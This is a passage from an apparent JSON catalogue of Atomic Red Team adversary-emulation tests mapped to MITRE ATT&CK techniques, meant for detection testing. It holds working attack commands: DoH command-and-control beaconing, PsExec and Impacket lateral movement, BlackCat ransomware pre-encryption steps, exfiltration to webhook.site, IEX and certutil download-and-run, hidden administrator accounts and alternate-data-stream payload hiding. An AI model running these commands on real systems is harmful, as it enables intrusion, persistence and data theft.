-DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "successCriteria": null}], "techniqueIds": ["clacwm639031x29mq4xbyhbbm"], "tags": []}, {"data": {"name": "DNS over HTTPS Large Query Volume", "shortName": "T1572", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an infected host sending a large volume of DoH queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | doh_server | Default DoH resolver | String | https://8.8.8.8/resolve | \n | query_type | DNS query type | String | TXT | \n | subdomain | Subdomain prepended to the domain name | String | atomicredteam | \n | query_volume | Number of DNS queries to send | Integer | 1000 | \n | domain | Default domain to simulate against | String | 127.0.0.1.xip.io | "}, "executionSteps": [{"description": "for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest \"#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}\" -UseBasicParsing).Content }\n", "successCriteria": null}], "techniqueIds": ["clacwm639031x29mq4xbyhbbm"], "tags": []}, {"data": {"name": "Testing usage of uncommonly used port with PowerShell", "shortName": "T1571", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | port | Specify uncommon port number | String | 8081 | \n | domain | Specify target hostname | String | google.com | "}, "executionSteps": [{"description": "Test-NetConnection -ComputerName #{domain} -port #{port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6i503id29mq3jeufco7", "clacwm26e00m429mq6quwd5se"], "tags": []}, {"data": {"name": "Testing usage of uncommonly used port", "shortName": "T1571", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Testing uncommonly used port utilizing telnet.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | port | Specify uncommon port number | String | 8081 | \n | domain | Specify target hostname | String | google.com | "}, "executionSteps": [{"description": "telnet #{domain} #{port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6i503id29mq3jeufco7", "clacwm26e00m429mq6quwd5se"], "tags": []}, {"data": {"name": "Use PsExec to execute a command on a remote host", "shortName": "T1569.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote hostname or IP address | String | localhost | \n | user_name | Username | String | DOMAIN\\Administrator | \n | password | Password | String | P@ssw0rd1 | \n | psexec_exe | Path to PsExec | String | C:\\PSTools\\PsExec.exe | "}, "executionSteps": [{"description": "#{psexec_exe} \\\\#{remote_host} -u #{user_name} -p #{password} -accepteula \"C:\\Windows\\System32\\calc.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6sy03u229mq4x507qa7", "clacwm2ex00tf29mq64fad1tk"], "tags": []}, {"data": {"name": "psexec.py (Impacket)", "shortName": "T1569.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Will execute a command on the remote host with Impacket psexec.py script.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_host | Remote hostname or IP address | String | 127.0.0.1 | \n | username | Username | String | Administrator | \n | domain | Target domain | String |  | \n | password | Password | String | P@ssw0rd1 | \n | command | Command to execute in target computer | String | whoami | "}, "executionSteps": [{"description": "psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\n", "successCriteria": null}], "techniqueIds": ["clacwm6sy03u229mq4x507qa7"], "tags": []}, {"data": {"name": "Execute a Command as a Service", "shortName": "T1569.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_name | Name of service to create | String | ARTService | \n | executable_command | Command to execute as a service | String | %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt | "}, "executionSteps": [{"description": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc.exe start #{service_name}\nsc.exe delete #{service_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6sy03u229mq4x507qa7", "clacwm2ex00tf29mq64fad1tk"], "tags": []}, {"data": {"name": "BlackCat pre-encryption cmds with Lateral Movement", "shortName": "T1569.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | targethost | Target hostname to attempt psexec connection to for emulation of lateral movement. | string | $ENV:COMPUTERNAME | "}, "executionSteps": [{"description": "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy $pathtoatomicsfolder\\T1569.002\\bin\\PsExec.exe $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\#{targethost} cmd.exe  /c echo \"--access-token\"\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6sy03u229mq4x507qa7"], "tags": []}, {"data": {"name": "Launchctl", "shortName": "T1569.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize launchctl\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | executable_path | Path of the executable to run. | Path | /System/Applications/Calculator.app/Contents/MacOS/Calculator | \n | label_name | Path of the executable to run. | String | evil | "}, "executionSteps": [{"description": "launchctl submit -l #{label_name} -- #{executable_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ci03bl29mq0za77u30", "clacwm21l00im29mq857ycxn2"], "tags": []}, {"data": {"name": "Data Exfiltration with ConfigSecurityPolicy", "shortName": "T1567", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltration of data using ConfigSecurityPolicy.exe\nhttps://debugactiveprocess.medium.com/data-exfiltration-with-lolbins-4d9c6e43dacf\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$path = resolve-path \"c:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\*\\ConfigSecurityPolicy.exe\"\n& $path[0] c:\\temp\\config.xml \"https://webhook.site?d=sensitive-data-here\"\n", "successCriteria": null}], "techniqueIds": ["clacwm60w02zm29mqeuir5pup"], "tags": []}, {"data": {"name": "Word spawned a command shell and used an IP address in the command line", "shortName": "T1566.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indiciator of malicious activity.\nUpon execution, CMD will be lauchned and ping 8.8.8.8\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | jse_path | Path for the macro to write out the \"malicious\" .jse file\n | String | C:\\Users\\Public\\art.jse | \n | ms_product | Maldoc application Word or Excel | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5x302w029mqfk040p4z", "clacwm2gg00uu29mqf8bw6t1x"], "tags": []}, {"data": {"name": "Download Phishing Attachment - VBScript", "shortName": "T1566.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).\nThe below will successfully download the macro-enabled Excel file to the current location.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "if (-not(Test-Path HKLM:SOFTWARE\\Classes\\Excel.Application)){\n  return 'Please install Microsoft Excel before running this test.'\n}\nelse{\n  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n  $fileName = 'PhishingAttachment.xlsm'\n  New-Item -Type File -Force -Path $fileName | out-null\n  $wc = New-Object System.Net.WebClient\n  $wc.Encoding = [System.Text.Encoding]::UTF8\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n  ($wc.DownloadString(\"$url\")) | Out-File $fileName\n}\n", "successCriteria": null}], "techniqueIds": ["clacwm2gg00uu29mqf8bw6t1x"], "tags": []}, {"data": {"name": "Download Macro-Enabled Phishing Attachment", "shortName": "T1566.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm\n", "successCriteria": null}], "techniqueIds": ["clacwm5x302w029mqfk040p4z"], "tags": []}, {"data": {"name": "Register Portable Virtualbox", "shortName": "T1564.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_file_path | Path to the MSI file | Path | PathToAtomicsFolder\\T1564.006\\bin\\Virtualbox_52.msi | \n | cab_file_path | Path to the CAB file | Path | PathToAtomicsFolder\\T1564.006\\bin\\common.cab | "}, "executionSteps": [{"description": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver\nregsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\"\nrundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\"\nsc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV\nsc start VBoxDRV\n", "successCriteria": null}], "techniqueIds": ["clacwm6ix03j429mqbh7g3e0f"], "tags": []}, {"data": {"name": "Create and start VirtualBox virtual machine", "shortName": "T1564.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vm_name | Name of the new virtual machine | String | Atomic VM | \n | virtualbox_exe | Path to the VirtualBox executable | Path | C:\\Program Files\\Oracle\\VirtualBox\\VirtualBox.exe | \n | vboxmanage_exe | Path to the executable for VBoxManage, the command-line interface to VirtualBox | Path | C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe | \n | virtualbox_download | URL for the current installer for the Windows version of VirtualBox, as of March 2022 | Url | https://download.virtualbox.org/virtualbox/6.1.32/VirtualBox-6.1.32-149290-Win.exe | \n | virtualbox_installer | Executable for the Virtualbox installer | String | VirtualBox-6.1.32-149290-Win.exe | "}, "executionSteps": [{"description": "\"#{vboxmanage_exe}\" createvm --name \"#{vm_name}\" --register\n\"#{vboxmanage_exe}\" modifyvm \"#{vm_name}\" --firmware efi\n\"#{vboxmanage_exe}\" startvm \"#{vm_name}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6ix03j429mqbh7g3e0f"], "tags": []}, {"data": {"name": "Create and start Hyper-V virtual machine", "shortName": "T1564.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vm_name | Name of the new virtual machine | String | Atomic VM | "}, "executionSteps": [{"description": "$VM = \"#{vm_name}\"\nNew-VM -Name $VM -Generation 2\nSet-VMFirmware $VM -EnableSecureBoot Off\nStart-VM $VM", "successCriteria": null}], "techniqueIds": ["clacwm6ix03j429mqbh7g3e0f"], "tags": []}, {"data": {"name": "Store file in Alternate Data Stream (ADS)", "shortName": "T1564.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | payload_path | Path of file to hide in ADS | Path | c:\\windows\\system32\\cmd.exe | \n | ads_file_path | Path of file to create an ADS under | Path | C:\\Users\\Public\\Libraries\\yanki\\desktop.ini | \n | ads_name | Name of ADS | String | desktop.ini | "}, "executionSteps": [{"description": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6t703ud29mqdc7m8uox", "clacwm24r00kx29mq6omgf2jq"], "tags": []}, {"data": {"name": "Create ADS PowerShell", "shortName": "T1564.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | File name of file to create ADS on. | String | $env:TEMP\\T1564.004_has_ads_powershell.txt | \n | ads_filename | Name of ADS file. | String | adstest.txt | "}, "executionSteps": [{"description": "echo \"test\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \"test\"\nset-content -path #{file_name} -stream #{ads_filename} -value \"test2\"\nset-content -path . -stream #{ads_filename} -value \"test3\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6t703ud29mqdc7m8uox", "clacwm24r00kx29mq6omgf2jq"], "tags": []}, {"data": {"name": "Create ADS command prompt", "shortName": "T1564.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | File name of file to create ADS on. | String | %temp%\\T1564.004_has_ads_cmd.txt | \n | ads_filename | Name of ADS. | String | adstest.txt | "}, "executionSteps": [{"description": "echo cmd /c echo \"Shell code execution.\"> #{file_name}:#{ads_filename}\nfor /f \"usebackq delims=?\" %i in (#{file_name}:#{ads_filename}) do %i\n", "successCriteria": null}], "techniqueIds": ["clacwm6t703ud29mqdc7m8uox", "clacwm24r00kx29mq6omgf2jq"], "tags": []}, {"data": {"name": "Alternate Data Streams (ADS)", "shortName": "T1564.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path | Path of ADS file | Path | c:\\ADS\\ | "}, "executionSteps": [{"description": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n", "successCriteria": null}], "techniqueIds": ["clacwm6t703ud29mqdc7m8uox", "clacwm24r00kx29mq6omgf2jq"], "tags": []}, {"data": {"name": "Hidden Window", "shortName": "T1564.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | powershell_command | Command to launch calc.exe from a hidden PowerShell Window | String | powershell.exe -WindowStyle hidden calc.exe | "}, "executionSteps": [{"description": "Start-Process #{powershell_command}\n", "successCriteria": null}], "techniqueIds": ["clacwm6n903nt29mq0p4286ej", "clacwm1xh00fz29mq98u4dwjb"], "tags": []}, {"data": {"name": "Create Hidden User using UniqueID < 500", "shortName": "T1564.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username to add | String | APT | "}, "executionSteps": [{"description": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n", "successCriteria": null}], "techniqueIds": ["clacwm6e203d829mq5j4f97nb", "clacwm1xf00fx29mqf66p6k9d"], "tags": []}, {"data": {"name": "Create Hidden User using IsHidden option", "shortName": "T1564.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a hidden user on macOS using IsHidden optoin\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username to add | String | APT | "}, "executionSteps": [{"description": "sudo dscl . -create /Users/#{user_name} IsHidden 1\n", "successCriteria": null}], "techniqueIds": ["clacwm6e203d829mq5j4f97nb", "clacwm1xf00fx29mqf66p6k9d"], "tags": []}, {"data": {"name": "Create Hidden User in Registry", "shortName": "T1564.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_password | Password for new user account | String | At0micRedTeam! | \n | user_name | Username | String | AtomicOperator | "}, "executionSteps": [{"description": "NET USER #{user_name}$ #{user_password} /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v #{user_name}$ /t REG_DWORD /d 0\n", "successCriteria": null}], "techniqueIds": ["clacwm6e203d829mq5j4f97nb"], "tags": []}, {"data": {"name": "Show all hidden files", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Show all hidden files on MacOS\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "defaults write com.apple.finder AppleShowAllFiles YES\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Mac Hidden file", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Hide a file on MacOS\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Hide Files Through Registry", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4"], "tags": []}, {"data": {"name": "Hide a Directory", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Hide a directory on MacOS\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Hidden files", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Requires Apple Dev Tools\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | path of file to hide | Path | /tmp/evil | "}, "executionSteps": [{"description": "setfile -a V #{filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Create Windows System File with Attrib", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_modify | File to modify using Attrib command | String | %temp%\\T1564.001.txt | "}, "executionSteps": [{"description": "attrib.exe +s #{file_to_modify}\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Create Windows Hidden File with Attrib", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_modify | File to modify using Attrib command | String | %temp%\\T1564.001.txt | "}, "executionSteps": [{"description": "attrib.exe +h #{file_to_modify}\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Create a hidden file in a hidden directory", "shortName": "T1564.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a hidden file inside a hidden directory\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n", "successCriteria": null}], "techniqueIds": ["clacwm6s403tc29mq9izt11r4", "clacwm1xc00fv29mqhd8jaydz"], "tags": []}, {"data": {"name": "Extract binary files via VBA", "shortName": "T1564", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module extracts a binary (calc.exe) from inside of another binary. \n\nIn the wild maldoc authors will use this technique to hide binaries inside of files stored \nwithin the office document itself. An example of this technique can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\nThis sample contains a document inside of itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n", "successCriteria": null}], "techniqueIds": ["clacwm5uu02tv29mqb1jx258x", "clacwm1xk00g129mqeg2dcq5j"], "tags": []}, {"data": {"name": "Create an \"Administrator \" user (with a space on the end)", "shortName": "T1564", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creating a user with a username containing with a space on the end\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-LocalUser -Name \"Administrator \" -NoPassword", "successCriteria": null}], "techniqueIds": ["clacwm5uu02tv29mqb1jx258x", "clacwm1xk00g129mqeg2dcq5j"], "tags": []}, {"data": {"name": "Create a user called \"$\" as noted here", "shortName": "T1564", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creating a user with a username containing \"$\"\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user $ ATOMIC123! /add /active:yes", "successCriteria": null}], "techniqueIds": ["clacwm1xk00g129mqeg2dcq5j"], "tags": []}, {"data": {"name": "Create a Hidden User Called \"$\"", "shortName": "T1564", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creating a user with a username containing \"$\"\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user $ ATOMIC123! /add /active:yes", "successCriteria": null}], "techniqueIds": ["clacwm5uu02tv29mqb1jx258x"], "tags": []}, {"data": {"name": "RDP hijacking", "shortName": "T1563.002", "repositoryId": 